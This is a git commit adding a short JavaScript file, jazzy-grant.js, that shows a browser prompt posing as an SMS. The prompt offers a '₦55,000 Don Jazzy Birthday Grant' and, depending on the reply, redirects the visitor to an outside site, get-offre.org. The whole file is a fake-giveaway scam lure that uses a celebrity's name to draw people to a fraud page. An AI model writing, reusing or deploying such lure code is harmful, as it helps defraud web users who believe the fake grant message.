fa411b434309e9ce29fc821ea42247e730f5b57b
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-11-08 01:13:37 -0800

    Create jazzy-grant.js

---
+++ jazzy-grant.js
@@ -0,0 +1,6 @@
+
+var password = 'Withdraw ₦55,000'
+password=prompt('SMS: Congratulations you are among the selected fans to receive ₦55,000 Don Jazzy Birthday Grant, Kindly press Ok to Withdraw Cash ','Withdraw ₦55,000');
+if (password != 'Withdraw ₦55,000') {
+location.href='https://get-offre.org/don-baba.html';
+}
